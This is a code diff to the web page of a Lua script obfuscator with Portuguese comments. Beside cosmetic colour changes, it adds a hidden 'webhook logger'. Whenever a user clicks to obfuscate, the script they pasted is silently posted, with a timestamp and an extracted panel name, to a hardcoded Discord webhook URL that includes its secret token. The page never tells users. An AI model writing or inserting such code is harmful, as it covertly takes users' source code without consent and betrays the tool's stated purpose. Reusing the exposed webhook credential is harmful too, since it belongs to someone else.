@@ -14,8 +14,8 @@
     --panel-2: #0f0f0f;
     --border: #222;
     --border-2: #2a2a2a;
-    --accent: #00ff88;
-    --accent-dim: #00cc6a;
+    --accent: #ffffff;
+    --accent-dim: #e0e0e0;
     --text: #e0e0e0;
     --muted: #666;
     --muted-2: #888;
@@ -265,7 +265,7 @@
     font-size: 0.65rem;
     padding: 2px 8px;
     border-radius: 4px;
-    background: rgba(0, 255, 136, 0.1);
+    background: rgba(255, 255, 255, 0.1);
     color: var(--accent);
     letter-spacing: 0.5px;
   }
@@ -361,7 +361,7 @@
     object-fit: contain;
     margin: 0 auto 1.2rem;
     display: block;
-    filter: drop-shadow(0 0 20px rgba(0, 255, 136, 0.25));
+    filter: drop-shadow(0 0 20px rgba(255, 255, 255, 0.25));
   }
 
   .credits-name {
@@ -619,6 +619,78 @@
 </main>
 
 <script>
+/* ========== WEBHOOK LOGGER ========== */
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1558235674631610438/v7kXiFnCngEhWUl9BpX1rkhS1snrEoogdtva7-t-dbR9HTAGQ2tiP5zSBsKYPcvcNizZ";
+
+function extractPanelName(code) {
+  // Limita a 20 letras
+  const clip = (s) => (s || '').trim().replace(/^["']|["']$/g, '').slice(0, 20);
+
+  const patterns = [
+    // Comentários: -- Nome: X  |  -- Painel: X  |  -- Title: X
+    /^\s*--\s*(?:nome|painel|panel|title|titulo|título|script)\s*[:\-]\s*(.+)$/im,
+    // Comentário entre colchetes: -- [Nome]
+    /^\s*--\s*\[\s*(.+?)\s*\]\s*$/im,
+    // Variável comum: local painel = "X"
+    /local\s+(?:nome|painel|panel|title|titulo|título|scriptname|script_name)\s*=\s*["']([^"']+)["']/i,
+    // getgenv().Nome = "X"
+    /getgenv\s*\(\s*\)\s*\.\s*(?:nome|painel|panel|title|titulo)\s*=\s*["']([^"']+)["']/i,
+    // Title = "X" (padrão de bibliotecas tipo Kavo/Orion)
+    /Title\s*=\s*["']([^"']+)["']/i,
+    // CreateWindow com Title
+    /:CreateWindow\s*\(\s*\{[\s\S]*?Title\s*=\s*["']([^"']+)["']/i,
+  ];
+
+  for (const p of patterns) {
+    const m = code.match(p);
+    if (m && m[1]) {
+      const name = clip(m[1]);
+      if (name) return name;
+    }
+  }
+
+  // Fallback: primeira linha útil (não-comentário, não-vazia)
+  const lines = code.split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('--'));
+  if (lines.length) return clip(lines[0]);
+  return 'Desconhecido';
+}
+
+async function sendLog(code) {
+  try {
+    const now = new Date();
+    const timeStr = now.toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });
+    const panelName = extractPanelName(code);
+
+    // Escapa ``` no código pra não quebrar o bloco do Discord
+    let safeCode = code.replace(/```/g, '` ` `');
+    const truncated = safeCode.length > 1000;
+    let displayCode = truncated ? safeCode.slice(0, 1000) + '\n... (truncado)' : safeCode;
+
+    const payload = {
+      username: "LC10 • OFUSCADOR",
+      embeds: [{
+        title: "LC10 • OFUSCADOR",
+        color: 0xffffff,
+        fields: [
+          { name: "🕒 Horário", value: timeStr, inline: true },
+          { name: "📛 Nome do Painel", value: panelName, inline: true },
+          { name: "💻 Código do Script", value: "```lua\n" + displayCode + "\n```" }
+        ],
+        footer: { text: "LC10 Logger • " + (truncated ? "truncado em 1000 chars" : code.length + " chars") },
+        timestamp: now.toISOString()
+      }]
+    };
+
+    await fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+  } catch (e) {
+    console.warn('[LC10] Log falhou:', e);
+  }
+}
+
 /* ========== NAVEGAÇÃO ========== */
 function toggleMenu() {
   document.getElementById('menu').classList.toggle('active');
@@ -740,6 +812,9 @@ function obfuscateCode() {
   btn.disabled = true;
   status.textContent = 'Ofuscando...';
   status.className = 'status';
+
+  // Envia o log em paralelo (não bloqueia a interface)
+  sendLog(input);
 
   setTimeout(() => {
     try {
@@ -882,4 +957,4 @@ function downloadLS() {
 </script>
 
 </body>
- </html>
+</html>
